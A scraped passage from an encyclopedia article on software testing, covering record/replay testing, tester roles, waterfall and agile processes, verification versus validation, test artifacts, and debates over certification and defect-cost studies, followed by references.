VCR testing, also known as "playback testing" or "record/replay" testing, is a testing technique for increasing the reliability and speed of regression tests that involve a component that is slow or unreliable to communicate with, often a third-party API outside of the tester's control. It involves making a recording ("cassette") of the system's interactions with the external component, and then replaying the recorded interactions as a substitute for communicating with the external system on subsequent runs of the test.

The technique was popularized in web development by the Ruby library 
vcr
.



Teamwork
[
edit
]


Roles
[
edit
]


In an organization, testers may be in a separate team from the rest of the 
software development
 team or they may be integrated into one team. Software testing can also be performed by non-dedicated software testers.

In the 1980s, the term 
software tester
 started to be used to denote a separate profession. 

Notable software testing roles and titles include:
[
65
]
 
test manager
, 
test lead
, 
test analyst
, 
test designer
, 
tester
, 
automation developer
, and 
test administrator
.
[
66
]




Processes
[
edit
]


Organizations that develop software, perform testing differently, but there are common patterns.
[
2
]




Waterfall development
[
edit
]


Further information: 
Capability Maturity Model Integration
 and 
Waterfall model


In 
waterfall development
, testing is generally performed after the code is completed, but before the product is shipped to the customer.
[
67
]
 This practice often results in the testing phase being used as a 
project
 buffer to compensate for project delays, thereby compromising the time devoted to testing.
[
10
]
: 145–146 


Some contend that the waterfall process allows for testing to start when the development project starts and to be a continuous process until the project finishes.
[
68
]




Agile development
[
edit
]


Agile software development
 commonly involves testing while the code is being written and organizing teams with both programmers and testers and with team members performing both programming and testing.

One agile practice, 
test-driven software development
 (TDD), is a way of 
unit testing
 such that unit-level testing is performed while writing the product code.
[
69
]
 Test code is updated as new features are added and failure conditions are discovered (bugs fixed). Commonly, the unit test code is maintained with the project code, integrated in the build process, and run on each build and as part of regression testing. Goals of this 
continuous integration
 is to support development and reduce defects.
[
70
]
[
69
]


Even in organizations that separate teams by programming and testing functions, many often have the programmers perform 
unit testing
.
[
71
]




Sample process
[
edit
]


The sample below is common for waterfall development. The same activities are commonly found in other development models, but might be described differently.



Requirements analysis
: Testing should begin in the requirements phase of the 
software development life cycle
. During the design phase, testers work to determine what aspects of a design are testable and with what parameters those tests work.


Test planning: 
Test strategy
, 
test plan
, 
testbed
 creation. Since many activities will be carried out during testing, a plan is needed.


Test development: Test procedures, 
test scenarios
, 
test cases
, test datasets, test scripts to use in testing software.


Test execution: Testers execute the software based on the plans and test documents then report any errors found to the development team. This part could be complex when running tests with a lack of programming knowledge.


Test reporting: Once testing is completed, testers generate metrics and make final reports on their 
test effort
 and whether or not the software tested is ready for release.


Test result analysis: Or Defect Analysis, is done by the development team usually along with the client, in order to decide what defects should be assigned, fixed, rejected (i.e. found software working properly) or deferred to be dealt with later.


Defect Retesting: Once a defect has been dealt with by the development team, it is retested by the testing team.


Regression testing
: It is common to have a small test program built of a subset of tests, for each integration of new, modified, or fixed software, in order to ensure that the latest delivery has not ruined anything and that the software product as a whole is still working correctly.


Test Closure: Once the test meets the exit criteria, the activities such as capturing the key outputs, lessons learned, results, logs, documents related to the project are archived and used as a reference for future projects.


Quality
[
edit
]


Main article: 
Software quality


Software verification and validation
[
edit
]


Main articles: 
Verification and validation (software)
 and 
Software quality control


Software testing is used in association with 
verification and validation
:
[
72
]




Verification: Have we built the software right? (i.e., does it implement the requirements).


Validation: Have we built the right software? (i.e., do the deliverables satisfy the customer).


The terms verification and validation are commonly used interchangeably in the industry; it is also common to see these two terms defined with contradictory definitions. According to the 
IEEE Standard
 Glossary of Software Engineering Terminology
:
[
11
]
: 80–81 




Verification is the process of evaluating a system or component to determine whether the products of a given development phase satisfy the conditions imposed at the start of that phase.


Validation is the process of evaluating a system or component during or at the end of the development process to determine whether it satisfies specified requirements.


And, according to the ISO 9000 standard:



Verification is confirmation by examination and through provision of objective evidence that specified requirements have been fulfilled.


Validation is confirmation by examination and through provision of objective evidence that the requirements for a specific intended use or application have been fulfilled.


The contradiction is caused by the use of the concepts of requirements and specified requirements but with different meanings.

In the case of IEEE standards, the specified requirements, mentioned in the definition of validation, are the set of problems, needs and wants of the stakeholders that the software must solve and satisfy. Such requirements are documented in a Software Requirements Specification (SRS). And, the products mentioned in the definition of verification, are the output artifacts of every phase of the software development process. These products are, in fact, specifications such as Architectural Design Specification, Detailed Design Specification, etc. The SRS is also a specification, but it cannot be verified (at least not in the sense used here, more on this subject below).

But, for the ISO 9000, the specified requirements are the set of specifications, as just mentioned above, that must be verified. A specification, as previously explained, is the product of a software development process phase that receives another specification as input. A specification is verified successfully when it correctly implements its input specification. All the specifications can be verified except the SRS because it is the first one (it can be validated, though). Examples: The Design Specification must implement the SRS; and, the Construction phase artifacts must implement the Design Specification.

So, when these words are defined in common terms, the apparent contradiction disappears.

Both the SRS and the software must be validated. The SRS can be validated statically by consulting with the stakeholders. Nevertheless, running some partial implementation of the software or a prototype of any kind (dynamic testing) and obtaining positive feedback from them, can further increase the certainty that the SRS is correctly formulated. On the other hand, the software, as a final and running product (not its artifacts and documents, including the source code) must be validated dynamically with the stakeholders by executing the software and having them to try it.

Some might argue that, for SRS, the input is the words of stakeholders and, therefore, SRS validation is the same as SRS verification. Thinking this way is not advisable as it only causes more confusion. It is better to think of verification as a process involving a formal and technical input document.



Software quality assurance
[
edit
]


In some organizations, software testing is part of a 
software quality assurance
 (SQA) process.
[
3
]
: 347 
 In SQA, software process specialists and auditors are concerned with the software development process rather than just the artifacts such as documentation, code and systems. They examine and change the 
software engineering
 process itself to reduce the number of faults that end up in the delivered software: the so-called defect rate. What constitutes an acceptable defect rate depends on the nature of the software; a flight simulator video game would have much higher defect tolerance than software for an actual airplane. Although there are close links with SQA, testing departments often exist independently, and there may be no SQA function in some companies.
[
citation needed
]


Software testing is an activity to investigate software under test in order to provide quality-related information to stakeholders. By contrast, QA (
quality assurance
) is the implementation of policies and procedures intended to prevent defects from reaching customers.



Measures
[
edit
]


Quality measures include such topics as 
correctness
, completeness, 
security
 and 
ISO/IEC 9126
 requirements such as capability, 
reliability
, 
efficiency
, 
portability
, 
maintainability
, compatibility, and 
usability
.

There are a number of frequently used 
software metrics
, or measures, which are used to assist in determining the state of the software or the adequacy of the testing.



Artifacts
[
edit
]


A software testing process can produce several 
artifacts
. The actual artifacts produced are a factor of the software development model used, stakeholder and organisational needs.



Test plan
[
edit
]


Main article: 
Test plan


A 
test plan
 is a document detailing the approach that will be taken for intended test activities. The plan may include aspects such as objectives, scope, processes and procedures, personnel requirements, and contingency plans.
[
51
]
 The test plan could come in the form of a single plan that includes all test types (like an acceptance or system test plan) and planning considerations, or it may be issued as a master test plan that provides an overview of more than one detailed test plan (a plan of a plan).
[
51
]
 A test plan can be, in some cases, part of a wide "
test strategy
" which documents overall testing approaches, which may itself be a master test plan or even a separate artifact.



Traceability matrix
[
edit
]


These paragraphs are an excerpt from 
Traceability matrix
.
[
edit
]

In 
software development
, a 
traceability matrix
 (TM)
[
73
]
: 244 
 is a document, usually in the form of a table, used to assist in determining the completeness of a relationship by correlating any two 
baselined documents
 using a many-to-many relationship comparison.
[
73
]
: 3–22 
 It is often used with high-level 
requirements
 (these often consist of marketing requirements) and detailed requirements of the product to the matching parts of 
high-level design
, detailed design, 
test plan
, and 
test cases
.


Test case
[
edit
]


Main article: 
Test case


A 
test case
 normally consists of a unique identifier, requirement references from a design specification, preconditions, events, a series of steps (also known as actions) to follow, input, output, expected result, and the actual result. Clinically defined, a test case is an input and an expected result.
[
74
]
 This can be as terse as "for condition x your derived result is y", although normally test cases describe in more detail the input scenario and what results might be expected. It can occasionally be a series of steps (but often steps are contained in a separate test procedure that can be exercised against multiple test cases, as a matter of economy) but with one expected result or expected outcome. The optional fields are a test case ID, test step, or order of execution number, related requirement(s), depth, test category, author, and check boxes for whether the test is automatable and has been automated. Larger test cases may also contain prerequisite states or steps, and descriptions. A test case should also contain a place for the actual result. These steps can be stored in a word processor document, spreadsheet, database, or other common repositories. In a database system, you may also be able to see past test results, who generated the results, and what system configuration was used to generate those results. These past results would usually be stored in a separate table.



Test script
[
edit
]


A 
test script
 is a procedure or programming code that replicates user actions. Initially, the term was derived from the product of work created by automated regression test tools. A test case will be a baseline to create test scripts using a tool or a program.



Test suite
[
edit
]


This section is an excerpt from 
Test suite
.
[
edit
]

In 
software development
, a 
test suite
, less commonly known as a validation suite, is a collection of 
test cases
 that are intended to be used to test a software program to show that it has some specified set of behaviors.
[
75
]
 A test suite often contains detailed instructions or goals for each collection of test cases and information on the system configuration to be used during testing. A group of test cases may also contain prerequisite states or steps and descriptions of the following tests.


Test fixture or test data
[
edit
]


Main article: 
Test fixture


In most cases, multiple sets of values or data are used to test the same functionality of a particular feature. All the test values and changeable environmental components are collected in separate files and stored as test data. It is also useful to provide this data to the client and with the product or a project. There are techniques to generate Test data.



Test harness
[
edit
]


Main article: 
Test harness


The software, tools, samples of data input and output, and configurations are all referred to collectively as a 
test harness
.



Test run
[
edit
]


A test run is a collection of test cases or test suites that the user is executing and comparing the expected with the actual results. Once complete, a report or all executed tests may be generated.



Certifications
[
edit
]


Further information: 
Certification § In software testing


Several certification programs exist to support the professional aspirations of software testers and quality assurance specialists. A few practitioners argue that the testing field is not ready for certification, as mentioned in the 
controversy
 section.



Controversy
[
edit
]


Some of the major 
software testing controversies
 include:



Agile vs. traditional


Should testers learn to work under conditions of uncertainty and constant change or should they aim at 
process "maturity"
? The 
agile testing
 movement has received growing popularity since the early 2000s mainly in commercial circles,
[
76
]
[
77
]
 whereas government and military
[
78
]
 software providers use this methodology but also the traditional test-last models (e.g., in the 
Waterfall model
).
[
citation needed
]


Manual vs. automated testing


Some writers believe that 
test automation
 is so expensive relative to its value that it should be used sparingly.
[
79
]
 The test automation then can be considered as a way to capture and implement the requirements. As a general rule, the larger the system and the greater the complexity, the greater the ROI in test automation. Also, the investment in tools and expertise can be amortized over multiple projects with the right level of knowledge sharing within an organization.


Is the existence of the 
ISO 29119
 software testing standard justified?


Significant opposition has formed out of the ranks of the context-driven school of software testing about the ISO 29119 standard. Professional testing associations, such as the International Society for Software Testing, have attempted to have the standard withdrawn.
[
80
]
[
81
]


Some practitioners declare that the testing field is not ready for certification


[
82
]
 No certification now offered actually requires the applicant to show their ability to test software. No certification is based on a widely accepted body of knowledge. Certification itself cannot measure an individual's productivity, their skill, or practical knowledge, and cannot guarantee their competence, or professionalism as a tester.
[
83
]


Studies used to show the relative expense of fixing defects


There are opposing views on the applicability of studies used to show the relative expense of fixing defects depending on their introduction and detection. For example:




It is commonly believed that the earlier a defect is found, the cheaper it is to fix it. The following table shows the cost of fixing the defect depending on the stage it was found.
[
84
]
 For example, if a problem in the requirements is found only post-release, then it would cost 10–100 times more to fix than if it had already been found by the requirements review. With the advent of modern 
continuous deployment
 practices and cloud-based services, the cost of re-deployment and maintenance may lessen over time.







Cost to fix a defect



Time detected





Requirements



Architecture



Construction



System test



Post-release





Time introduced



Requirements



1×



3×



5–10×



10×



10–100×





Architecture



–



1×



10×



15×



25–100×





Construction



–



–



1×



10×



10–25×







The data from which this table is extrapolated is scant. Laurent Bossavit says in his analysis:





The "smaller projects" curve turns out to be from only two teams of first-year students, a sample size so small that extrapolating to "smaller projects in general" is totally indefensible. The GTE study does not explain its data, other than to say it came from two projects, one large and one small. The paper cited for the Bell Labs "Safeguard" project specifically disclaims having collected the fine-grained data that Boehm's data points suggest. The IBM study (Fagan's paper) contains claims that seem to contradict Boehm's graph and no numerical results that clearly correspond to his data points.


Boehm doesn't even cite a paper for the TRW data, except when writing for "Making Software" in 2010, and there he cited the original 1976 article. There exists a large study conducted at TRW at the right time for Boehm to cite it, but that paper doesn't contain the sort of data that would support Boehm's claims.
[
85
]




See also
[
edit
]




Data validation
 – The process of ensuring computer data is both correct and useful


Cross-browser testing
 – Checking web applications in various browsers


Database testing
, testing of databases


Domain testing


Dynamic program analysis
 – Analysis of software performed when running a program


Formal verification
 – Proving or disproving the correctness of certain intended algorithms


Graphical user interface testing
 – term in software engineering
Pages displaying wikidata descriptions as a fallback


Independent test organization
 – Organization that tests according to agreed requirements


Manual testing
 – Testing software without automation


Orthogonal array testing
 – software testing technique
Pages displaying wikidata descriptions as a fallback


Pair testing
 – Software testing technique


Reverse semantic traceability
 – Quality control technique


Software testing tactics


Test management tool
 – Stores test steps, test planning and reporting


Trace table
 – Software testing technique


Web testing
 – Software testing that focuses on web applications




References
[
edit
]






^
 
Kaner, Cem
 (November 17, 2006). 
Exploratory Testing
 
(PDF)
. Quality Assurance Institute Worldwide Annual Software Testing Conference. Orlando, FL
. Retrieved 
November 22,
 2014
.




^ 
a
 
b
 
Pan, Jiantao (Spring 1999). 
"Software Testing"
 (coursework). Carnegie Mellon University
. Retrieved 
November 21,
 2017
.




^ 
a
 
b
 
c
 
d
 
Kaner, Cem
; Falk, Jack; Nguyen, Hung Quoc (1999). 
Testing Computer Software
 (2nd ed.). New York: John Wiley and Sons. 
ISBN
 
978-0-471-35846-6
.




^
 
Leitner, Andreas; Ciupa, Ilinca; Oriol, Manuel; 
Meyer, Bertrand
; Fiva, Arno (September 2007). 
Contract Driven Development = Test Driven Development – Writing Test Cases
 
(PDF)
. ESEC/FSE'07: European Software Engineering Conference and the ACM SIGSOFT Symposium on the Foundations of Software Engineering 2007. Dubrovnik, Croatia
. Retrieved 
December 8,
 2017
.




^ 
a
 
b
 
Kolawa, Adam; Huizinga, Dorota (2007). 
Automated Defect Prevention: Best Practices in Software Management
. Wiley-IEEE Computer Society Press. 
ISBN
 
978-0-470-04212-0
.




^
 
Cohn, Mike (2009). 
Succeeding with Agile: Software Development Using Scrum
. Addison-Wesley Professional. 
ISBN
 
978-0321579362
.




^
 
Molina, Alessandro (2021). 
Crafting Test-Driven Software with Python: Write test suites that scale with your applications' needs and complexity using Python and PyTest
. Packt Publishing. 
ISBN
 
978-1838642655
.




^
 
Fernandes da Costa, Lucas (2021). 
Testing JavaScript Applications
. Manning. 
ISBN
 
978-1617297915
.




^
 
"The Economic Impacts of Inadequate Infrastructure for Software Testing"
 
(PDF)
. 
National Institute of Standards and Technology
. May 2002
. Retrieved 
December 19,
 2017
.




^ 
a
 
b
 
c
 
Myers, Glenford J.
 (1979). 
The Art of Software Testing
. John Wiley and Sons. 
ISBN
 
978-0-471-04328-7
.




^ 
a
 
b
 
IEEE Standard Glossary of Software Engineering Terminology
, IEEE, 1990, 
doi
:
10.1109/IEEESTD.1990.101064
, 
ISBN
 
978-1-55937-067-7




^
 
"Certified Tester Foundation Level Syllabus"
. 
International Software Testing Qualifications Board
. March 31, 2011. Section 1.1.2. Archived from 
the original
 
(pdf)
 on October 28, 2017
. Retrieved 
December 15,
 2017
.




^
 
"Certified Tester Foundation Level Syllabus"
 
(PDF)
. 
International Software Testing Qualifications Board
. July 1, 2005. Principle 2, Section 1.3. Archived from 
the original
 
(PDF)
 on December 17, 2008
. Retrieved 
December 15,
 2017
.




^
 
Ramler, Rudolf; Kopetzky, Theodorich; Platz, Wolfgang (April 17, 2012). 
Combinatorial Test Design in the TOSCA Testsuite: Lessons Learned and Practical Implications
. IEEE Fifth International Conference on Software Testing and Validation (ICST). Montreal, QC, Canada. 
doi
:
10.1109/ICST.2012.142
.




^
 
Kaner, Cem; Bach, James; Pettichord, Bret (2001). 
Lessons Learned in Software Testing: A Context-Driven Approach
. Wiley. pp. 
31
–43. 
ISBN
 
978-0-471-08112-8
.




^
 
Kolawa, Adam; Huizinga, Dorota (2007). 
Automated Defect Prevention: Best Practices in Software Management
. Wiley-IEEE Computer Society Press. p. 74. 
ISBN
 
978-0-470-04212-0
.




^
 
O’Connor, Rory V.; Akkaya, Mariye Umay; Kemaneci, Kerem; Yilmaz, Murat; Poth, Alexander; Messnarz, Richard (October 15, 2015). 
Systems, Software and Services Process Improvement: 22nd European Conference, EuroSPI 2015, Ankara, Turkey, September 30 -- October 2, 2015. Proceedings
. Springer. 
ISBN
 
978-3-319-24647-5
.




^
 
Bourque, Pierre; Fairley, Richard E., eds. (2014). 
"Chapter 5"
. 
Guide to the Software Engineering Body of Knowledge
. 3.0. IEEE Computer Society. 
ISBN
 
978-0-7695-5166-1
. Retrieved 
January 2,
 2018
.




^
 
Bourque, P.; Fairley, R.D., eds. (2014). 
"Chapter 4: Software Testing"
 
(PDF)
. 
SWEBOK v3.0: Guide to the Software Engineering Body of Knowledge
. IEEE. pp. 4–1–4–17. 
ISBN
 
978-0-7695-5166-1
. Archived from 
the original
 
(PDF)
 on June 19, 2018
. Retrieved 
July 13,
 2018
.




^
 
Dooley, J. (2011). 
Software Development and Professional Practice
. APress. pp. 193–4. 
ISBN
 
978-1-4302-3801-0
.




^
 
Wiegers, K. (2013). 
Creating a Software Engineering Culture
. Addison-Wesley. pp. 211–2. 
ISBN
 
978-0-13-348929-3
.




^
 
Kolawa, Adam; Huizinga, Dorota (2007). 
Automated Defect Prevention: Best Practices in Software Management
. Wiley-IEEE Computer Society Press. p. 75. 
ISBN
 
978-0-470-04212-0
.




^ 
a
 
b
 
Graham, D.; Van Veenendaal, E.; Evans, I. (2008). 
Foundations of Software Testing
. Cengage Learning. pp. 57–58. 
ISBN
 
978-1-84480-989-9
.




^ 
a
 
b
 
c
 
d
 
Oberkampf, W.L.; Roy, C.J. (2010). 
Verification and Validation in Scientific Computing
. Cambridge University Press. pp. 154–5. 
ISBN
 
978-1-139-49176-1
.




^
 
Lee, D.; Netravali, A.N.; Sabnani, K.K.; Sugla, B.; John, A. (1997). "Passive testing and applications to network management". 
Proceedings 1997 International Conference on Network Protocols
. IEEE Comput. Soc. pp. 113–122. 
doi
:
10.1109/icnp.1997.643699
. 
ISBN
 
978-0-8186-8061-8
. 
S2CID
 
42596126
.




^
 
Cem Kaner,  "
A Tutorial in Exploratory Testing
 
Archived
 2013-06-12 at the 
Wayback Machine
", p.2




^
 
Cem Kaner, 
A Tutorial in Exploratory Testing
 
Archived
 2013-06-12 at the 
Wayback Machine
, p. 36.




^
 
Lee, D.; Yannakakis, M. (1996). 
"Principles and methods of testing finite state machines-a survey"
. 
Proceedings of the IEEE
. 
84
 (8): 1090–1123. 
doi
:
10.1109/5.533956
.




^
 
Petrenko, A.; Yevtushenko, N. (2011). "Adaptive testing of deterministic implementations specified by nondeterministic FSMs". 
In Testing Software and Systems: 23rd IFIP WG 6.1 International Conference, ICTSS 2011, Paris, France, November 7-10
. Lecture Notes in Computer Science. Vol. 7019. Springer Berlin Heidelberg. pp. 162–178. 
doi
:
10.1007/978-3-642-24580-0_12
. 
ISBN
 
978-3-642-24579-4
.




^
 
Petrenko, A.; Yevtushenko, N. (2014). "Adaptive testing of nondeterministic systems with FSM". 
In 2014 IEEE 15th International Symposium on High-Assurance Systems Engineering
. IEEE. pp. 224–228. 
doi
:
10.1109/HASE.2014.39
. 
ISBN
 
978-1-4799-3466-9
.




^ 
a
 
b
 
c
 
d
 
Limaye, M.G. (2009). 
Software Testing
. Tata McGraw-Hill Education. pp. 108–11. 
ISBN
 
978-0-07-013990-9
.




^ 
a
 
b
 
c
 
d
 
Saleh, K.A. (2009). 
Software Engineering
. J. Ross Publishing. pp. 224–41. 
ISBN
 
978-1-932159-94-3
.




^ 
a
 
b
 
c
 
Ammann, P.; Offutt, J. (2016). 
Introduction to Software Testing
. Cambridge University Press. p. 26. 
ISBN
 
978-1-316-77312-3
.




^
 
Everatt, G.D.; McLeod Jr., R. (2007). "Chapter 7: Functional Testing". 
Software Testing: Testing Across the Entire Software Development Life Cycle
. John Wiley & Sons. pp. 99–121. 
ISBN
 
978-0-470-14634-7
.




^ 
a
 
b
 
Cornett, Steve (c. 1996). 
"Code Coverage Analysis"
. Bullseye Testing Technology. Introduction
. Retrieved 
November 21,
 2017
.




^ 
a
 
b
 
Black, R. (2011). 
Pragmatic Software Testing: Becoming an Effective and Efficient Test Professional
. John Wiley & Sons. pp. 44–6. 
ISBN
 
978-1-118-07938-6
.




^
 
As a simple example, the 
C
 function 
int
 
f
(
int
 
x
){
return
 
x
*
x
-6
*
x
+
8
;}
 consists of only one statement. All tests against a specification 
f
(
x
)
>=
0
 will succeed, except if 
x
=
3
 happens to be chosen.




^
 
Patton, Ron (2005). 
Software Testing
 (2nd ed.). Indianapolis: Sams Publishing. 
ISBN
 
978-0-672-32798-8
.




^
 
Laycock, Gilbert T. (1993). 
The Theory and Practice of Specification Based Software Testing
 
(PDF)
 (dissertation thesis). Department of Computer Science, 
University of Sheffield
. Retrieved 
January 2,
 2018
.




^
 
Bach, James
 (June 1999). 
"Risk and Requirements-Based Testing"
 
(PDF)
. 
Computer
. 
32
 (6): 113–114
. Retrieved 
August 19,
 2008
.




^
 
Mathur, A.P. (2011). 
Foundations of Software Testing
. Pearson Education India. p. 63. 
ISBN
 
978-81-317-5908-0
.




^ 
a
 
b
 
Clapp, Judith A. (1995). 
Software Quality Control, Error Analysis, and Testing
. William Andrew. p. 313. 
ISBN
 
978-0-8155-1363-6
. Retrieved 
January 5,
 2018
.




^
 
Mathur, Aditya P. (2007). 
Foundations of Software Testing
. Pearson Education India. p. 18. 
ISBN
 
978-81-317-1660-1
.




^
 
Lönnberg, Jan (October 7, 2003). 
Visual testing of software
 
(PDF)
 (MSc thesis). Helsinki University of Technology
. Retrieved 
January 13,
 2012
.




^
 
Chima, Raspal. 
"Visual testing"
. 
TEST Magazine
. Archived from 
the original
 on July 24, 2012
. Retrieved 
January 13,
 2012
.




^ 
a
 
b
 
c
 
Lewis, W.E. (2016). 
Software Testing and Continuous Quality Improvement
 (3rd ed.). CRC Press. pp. 68–73. 
ISBN
 
978-1-4398-3436-7
.




^ 
a
 
b
 
Ransome, J.; Misra, A. (2013). 
Core Software Security: Security at the Source
. CRC Press. pp. 140–3. 
ISBN
 
978-1-4665-6095-6
.




^
 
"SOA Testing Tools for Black, White and Gray Box"
 (white paper). Crosscheck Networks. Archived from 
the original
 on October 1, 2018
. Retrieved 
December 10,
 2012
.




^ 
a
 
b
 
Myers, G. (2004). Sandler, C; Badgett, T; Thomas, M. (eds.). 
The Art of Software Testing
 (2 ed.). Wiley. 
ISBN
 
9780471469124
.




^
 
Ammann, Paul; Offutt, Jeff (January 28, 2008). 
Introduction to Software Testing
. 
Cambridge University Press
. p. 215. 
ISBN
 
978-0-521-88038-1
. Retrieved 
November 29,
 2017
.




^ 
a
 
b
 
c
 
Lewis, W.E. (2016). 
Software Testing and Continuous Quality Improvement
 (3rd ed.). CRC Press. pp. 92–6. 
ISBN
 
978-1-4398-3436-7
.




^
 
Machado, P.; Vincenzi, A.; Maldonado, J.C. (2010). 
"Chapter 1: Software Testing: An Overview"
. In Borba, P.; Cavalcanti, A.; Sampaio, A.; Woodcook, J. (eds.). 
Testing Techniques in Software Engineering
. Springer Science & Business Media. pp. 13–14. 
ISBN
 
978-3-642-14334-2
.




^
 
Clapp, J.A.; Stanten, S.F.; Peng, W.W.; et al. (1995). 
Software Quality Control, Error Analysis, and Testing
. Nova Data Corporation. p. 254. 
ISBN
 
978-0-8155-1363-6
.




^ 
a
 
b
 
c
 
"ISTQB CTFL Syllabus 2018"
 
(PDF)
. 
ISTQB - International Software Testing Qualifications Board
. 
Archived
 
(PDF)
 from the original on March 24, 2022
. Retrieved 
April 11,
 2022
.




^
 
Woods, Anthony J. (June 5, 2015). 
"Operational Acceptance – an application of the ISO 29119 Software Testing standard"
 (Whitepaper). Capgemini Australia
. Retrieved 
January 9,
 2018
.




^
 
"Standard Glossary of Terms used in Software Testing"
 
(PDF)
. Version 3.1. International Software Testing Qualifications Board
. Retrieved 
January 9,
 2018
.




^
 
O'Reilly, Tim (September 30, 2005). 
"What is Web 2.0"
. O'Reilly Media. Section 4. End of the Software Release Cycle
. Retrieved 
January 11,
 2018
.




^
 
Auerbach, Adam (August 3, 2015). 
"Part of the Pipeline: Why Continuous Testing Is Essential"
. 
TechWell Insights
. TechWell Corp
. Retrieved 
January 12,
 2018
.




^
 
Philipp-Edmonds, Cameron (December 5, 2014). 
"The Relationship between Risk and Continuous Testing: An Interview with Wayne Ariola"
. 
Stickyminds
. Retrieved 
January 16,
 2018
.




^
 
Ariola, Wayne; Dunlop, Cynthia (October 2015). 
DevOps: Are You Pushing Bugs to Clients Faster?
 
(PDF)
. Pacific Northwest Software Quality Conference
. Retrieved 
January 16,
 2018
.




^
 
Auerbach, Adam (October 2, 2014). 
"Shift Left and Put Quality First"
. 
TechWell Insights
. TechWell Corp
. Retrieved 
January 16,
 2018
.




^
 
"Section 4.38". 
ISO/IEC/IEEE 29119-1:2013 – Software and Systems Engineering – Software Testing – Part 1 – Concepts and Definitions
. International Organization for Standardization
. Retrieved 
January 17,
 2018
.




^
 
"Globalization Step-by-Step: The World-Ready Approach to Testing. Microsoft Developer Network"
. Microsoft Developer Network. Archived from 
the original
 on June 23, 2012
. Retrieved 
January 13,
 2012
.




^
 
Claessen, Koen; Hughes, John (2000). 
"QuickCheck"
. 
Proceedings of the fifth ACM SIGPLAN international conference on Functional programming
. Icfp '00. pp. 268–279. 
doi
:
10.1145/351240.351266
. 
ISBN
 
978-1-58113-202-1
. 
S2CID
 
5668071
.




^
 
Gelperin, David
; 
Hetzel, Bill
 (June 1, 1988). 
"The growth of software testing"
. 
Communications of the ACM
. 
31
 (6): 687–695. 
doi
:
10.1145/62959.62965
. 
S2CID
 
14731341
.




^
 
Gregory, Janet; Crispin, Lisa (2014). 
More Agile Testing
. Addison-Wesley Professional. pp. 23–39. 
ISBN
 
978-0-13-374956-4
.




^
 
"Software Testing Lifecycle"
. 
etestinghub
. Testing Phase in Software Testing
. Retrieved 
January 13,
 2012
.




^
 
Dustin, Elfriede (2002). 
Effective Software Testing
. Addison-Wesley Professional. p. 3. 
ISBN
 
978-0-201-79429-8
.




^ 
a
 
b
 
"What is Test Driven Development (TDD)?"
. 
Agile Alliance
. December 5, 2015
. Retrieved 
March 17,
 2018
.




^
 
"Test-Driven Development and Continuous Integration for Mobile Applications"
. 
Microsoft Developer Network
. January 14, 2009
. Retrieved 
March 17,
 2018
.




^
 
Brown, Chris; Cobb, Gary; Culbertson, Robert (April 12, 2002). 
Introduction to Rapid Software Testing
.




^
 
Tran, Eushiuan (1999). 
"Verification/Validation/Certification"
 (coursework). Carnegie Mellon University
. Retrieved 
August 13,
 2008
.




^ 
a
 
b
 
Gotel, Orlena; 
Cleland-Huang, Jane
; Hayes, Jane Huffman; Zisman, Andrea; Egyed, Alexander; Grünbacher, Paul; Dekhtyar, Alex; Antoniol, Giuliano; Maletic, Jonathan (January 1, 2012). Cleland-Huang, Jane; Gotel, Orlena; Zisman, Andrea (eds.). 
Software and Systems Traceability
. Springer London. 
doi
:
10.1007/978-1-4471-2239-5_1
. 
ISBN
 
9781447122388
.




^
 
IEEE (1998). 
IEEE standard for software test documentation
. New York: IEEE. 
ISBN
 
978-0-7381-1443-9
.




^
 
Pinto, Leandro Sales; Sinha, Saurabh; Orso, Alessandro (November 11, 2012). 
"Understanding myths and realities of test-suite evolution"
. 
Proceedings of the ACM SIGSOFT 20th International Symposium on the Foundations of Software Engineering
. Association for Computing Machinery. pp. 1–11. 
doi
:
10.1145/2393596.2393634
. 
ISBN
 
9781450316149
. 
S2CID
 
9072512
.




^
 
Strom, David (July 1, 2009). 
"We're All Part of the Story"
. Software Test & Performance Collaborative. Archived from 
the original
 on August 31, 2009.




^
 
Griffiths, M. (2005). "Teaching agile project management to the PMI". 
Agile Development Conference (ADC'05)
. ieee.org. pp. 318–322. 
doi
:
10.1109/ADC.2005.45
. 
ISBN
 
978-0-7695-2487-0
. 
S2CID
 
30322339
.




^
 
Willison, John S. (April 2004). 
"Agile Software Development for an Agile Force"
. 
CrossTalk
 (April 2004). STSC. Archived from 
the original
 on October 29, 2005.




^
 
An example is Mark Fewster, Dorothy Graham: 
Software Test Automation.
 Addison Wesley, 1999, 
ISBN
 
978-0-201-33140-0
.




^
 
"stop29119"
. 
commonsensetesting.org
. Archived from 
the original
 on October 2, 2014.




^
 
Paul Krill (August 22, 2014). 
"Software testers balk at ISO 29119 standards proposal"
. 
InfoWorld
.




^
 
Kaner, Cem
 (2001). 
"NSF grant proposal to 'lay a foundation for significant improvements in the quality of academic and commercial courses in software testing'
"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on November 27, 2009
. Retrieved 
October 13,
 2006
.




^
 
Kaner, Cem
 (2003). 
Measuring the Effectiveness of Software Testers
 
(PDF)
. STAR East. Archived from 
the original
 
(PDF)
 on March 26, 2010
. Retrieved 
January 18,
 2018
.




^
 
McConnell, Steve (2004). 
Code Complete
 (2nd ed.). Microsoft Press. p. 
29
. 
ISBN
 
978-0-7356-1967-8
.




^
 
Bossavit, Laurent (November 20, 2013). "The cost of defects: an illustrated history". 
The Leprechauns of Software Engineering: How folklore turns into fact and what to do about it
. leanpub.






Further reading
[
edit
]


Meyer, Bertrand (August 2008). 
"Seven Principles of Software Testing"
 
(PDF)
. 
Computer
. Vol. 41, no. 8. pp. 99–101. 
doi
:
10.1109/MC.2008.306
. Retrieved 
November 21,
 2017
.


External links
[
edit
]








Wikimedia Commons has media related to 
Software testing
.










At 
Wikiversity
, you can learn more and teach others about 
Software testing
 at the 
Department of Software testing




‹ The 
template
 below (
Curlie
) is being considered for deletion. See 
templates for discussion
 to help reach a consensus. ›
Software testing tools and products
 at 
Curlie


"Software that makes Software better" Economist.com


v
t
e
Computer science
Note: This template roughly follows the 2012 
ACM Computing Classification System
.
Hardware


Printed circuit board


Peripheral


Integrated circuit


Very Large Scale Integration


Systems on Chip (SoCs)


Energy consumption (Green computing)


Electronic design automation


Hardware acceleration


Processor


Size
 / 
Form


Computer systems organization


Computer architecture


Computational complexity


Dependability


Embedded system


Real-time computing


Networks


Network architecture


Network protocol


Network components


Network scheduler


Network performance evaluation


Network service


Software organization


Interpreter


Middleware


Virtual machine


Operating system


Software quality


Software notations
 and 
tools


Programming paradigm


Programming language


Compiler


Domain-specific language


Modeling language


Software framework


Integrated development environment


Software configuration management


Software library


Software repository


Software development


Control variable


Software development process


Requirements analysis


Software design


Software construction


Software deployment


